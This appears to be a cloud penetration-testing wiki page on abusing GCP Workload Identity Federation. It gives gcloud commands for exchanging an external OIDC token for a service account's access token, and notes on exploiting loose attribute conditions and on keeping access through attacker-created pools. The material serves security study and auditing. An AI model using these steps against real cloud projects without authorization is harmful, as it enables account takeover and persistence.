---
title: "Federation: Workload Identity Federation into a service account"
description: "Entering GCP through Workload Identity Federation: exchanging an external OIDC or AWS and Azure token for a Google service-account token without a key."
keywords:
  - workload identity federation
  - OIDC
  - token exchange
  - service account
  - external identity
---

# Federation

Workload Identity Federation lets an external identity (an OIDC issuer, an AWS role, or an Azure identity) impersonate a Google **service account** without a long-lived key. A workload identity pool declares the trusted issuer and an attribute mapping; a service account grants the pool's principals `roles/iam.workloadIdentityUser`. When the attribute condition is loose, an attacker who can obtain a matching external token exchanges it for the service account's Google token.

## Exchanging an external token

```bash
# the external credential config points at the pool provider and the token source
gcloud iam workload-identity-pools create-cred-config \
  projects/<n>/locations/global/workloadIdentityPools/<pool>/providers/<prov> \
  --service-account=<target-sa>@<project>.iam.gserviceaccount.com \
  --output-file=cred.json --credential-source-file=token.jwt
GOOGLE_APPLICATION_CREDENTIALS=cred.json gcloud auth print-access-token --impersonate-service-account=<target-sa>
```

The STS endpoint `sts.googleapis.com/v1/token` performs the raw exchange if you drive it directly with the external JWT.

## Reading the trust

```bash
gcloud iam workload-identity-pools providers describe <prov> \
  --workload-identity-pool=<pool> --location=global
# inspect attribute-mapping and attribute-condition: a missing or wildcard
# condition on google.subject / attribute.repository accepts any issuer token
```

## Exploitation notes

- The weakness is the provider's `attribute-condition`: no condition, or one that only checks the issuer and not the subject, lets any token the issuer mints assume the service account.
- GitHub Actions, GitLab, and generic OIDC providers are the common issuers; a loose `attribute.repository` mapping accepts workflows from repositories you control.
- Federation leaves no key behind, so it is also a persistence foothold when you can create the pool and binding yourself.

## Tools

- **gcloud** (`iam workload-identity-pools`, `auth print-access-token --impersonate-service-account`): configure and exercise the exchange.
- **jwt_tool**: inspect and shape the external JWT claims.

## References

- [Rhino Security Labs: GCP privilege escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Workload Identity Federation](https://cloud.google.com/iam/docs/workload-identity-federation)
